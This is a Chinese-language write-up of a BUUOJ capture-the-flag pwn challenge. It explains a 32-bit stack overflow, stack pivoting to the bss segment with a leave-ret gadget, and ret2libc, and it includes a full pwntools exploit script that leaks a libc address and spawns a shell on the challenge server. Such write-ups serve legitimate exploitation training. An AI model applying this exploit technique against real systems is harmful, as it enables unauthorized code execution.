# [Black Watch 入群题]PWN

[题目地址](https://buuoj.cn/challenges#[Black%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98]PWN)

继续巩固基础。

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

这个配置见了无数遍了。main内部调用了漏洞函数。

```c
void vul_function(void)

{
  size_t sVar1;
  undefined input [24];
  
  sVar1 = strlen(m1);
  write(1,m1,sVar1);
  read(0,s,0x200);
  sVar1 = strlen(m2);
  write(1,m2,sVar1);
  read(0,input,32);
  return;
}
```

m1和m2是两句话，不重要，关键在于接收输入的s在bss段。根据经验，一般用bss段接收输入的地方80%有问题。继续往下看，还有一个接收输入的，有明显栈溢出。不过input距离ebp有0x18，32-0x18=8，32位系统只能填个ebp和返回地址。我瞬间就想到了返回s的地址，思路倒是对了，基础没跟上。当时脑抽了一下直接往s里放shellcode，把nx当空气。这道题应该用之前见过一次的栈迁移。栈迁移最常用的就是leave-ret这段gadget。

```
leave
//mov esp ebp  将ebp指向的地址给esp
//pop ebp  将esp指向的地址存放的值赋值给ebp
ret
//pop eip  将esp指向的地址存放的值赋值给eip
```

这题该怎么做呢？很简单，把ebp覆盖为s的地址-4，返回地址覆盖为leave-ret gadget。注意程序本身就有一个leave-ret，因此我们输入payload会执行两次leave-ret。第一次把esp指向ebp，pop ebp将s地址-4弹进ebp，同时esp+4，指向gadget的地址（每次pop esp都会+4，push则是会-4，因为栈向低地址增长）。第二次继续把esp指向的东西设置为ebp指向的东西，但这次ebp里已经是s地址-4了，于是我们成功把esp改为s地址-4。还没停，继续pop ebp，ebp倒不会有改变，而esp因为pop又上升4，指向s。最后pop eip执行gadget。曾经不理解的地方是为什么一定要两次才能迁移栈，今天意识到第一个leave的mov esp ebp执行时ebp还没有改变，保持原来的值，所以esp的值还在当前栈上，直到下一次pop ebp真正改变ebp第二个leave才能把目标地址放进esp中。

这回nx没用了，nx让我们不能直接跳转到执行栈外的一块地方执行shellcode，但是我们直接把当前程序的执行栈搬过去了，nx它能拿我们怎么样呢？剩下的步骤就是普通泄露地址+ret2libc了。

```python
from pwn import *
context.log_level='debug'
p=remote("node4.buuoj.cn",29271)
leave_ret=0x08048408
c=0x0804a300
write_plt=0x08048380
write_got=0x0804a01c
main=0x08048513
payload=p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)
p.sendafter("name?",payload)
payload1=b'a'*0x18+p32(c-4)+p32(leave_ret)
p.sendafter("say?",payload1)
write_addr=u32(p.recv(4))
libc_base=write_addr-	869312
system_addr=libc_base+	239936
binsh=libc_base+	0x0015902b 
payload = p32(system_addr) + p32(main) + p32(binsh)
p.sendafter('name?',payload)
p.sendafter("say?",payload1)
p.interactive()
```

发送payload1时不能用sendline，否则无法getshell。在这里卡了好久。补充带图解释的[wp](https://blog.csdn.net/mcmuyanga/article/details/109260008)。

今天又看了一眼，栈迁移的结果并不能让我们执行任意的shellcode，只是多开辟了一块用来写rop链的空间。所以这类题的一个特征是，rop链攻击思路很明朗，但没有足够的空间写rop链。所以用栈迁移找到一块方便写rop链的地方